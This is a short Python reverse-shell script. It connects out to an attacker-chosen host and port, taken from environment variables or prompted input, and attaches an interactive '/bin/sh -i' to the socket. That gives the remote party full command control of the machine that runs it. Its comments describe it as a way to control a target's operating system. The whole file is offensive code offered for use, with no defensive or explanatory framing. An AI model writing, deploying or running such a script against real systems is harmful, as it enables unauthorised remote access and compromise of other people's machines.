#!/usr/bin/env python3
import socket
# control operating system of target machine
import os
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # client computer can connect to others
sin = s.makefile('r', buffering=None)
sout = s.makefile('w', buffering=None)

if '__host__' in os.environ:
    host = os.environ['__host__']
else:
    host = str(input("H: "))

if '__port__' in os.environ:
    port = int(os.environ['__port__'])
else:
    port = int(input("P: "))

s.connect((host, port)) # binds client computer to server computer

# opens up a process to run a command similar to running in terminal, takes out any output and pipes out to standard stream
cmd = subprocess.Popen("/bin/sh -i", shell=True, stdout=sout, stderr=sout, stdin=sin) 

# close connection
s.close()






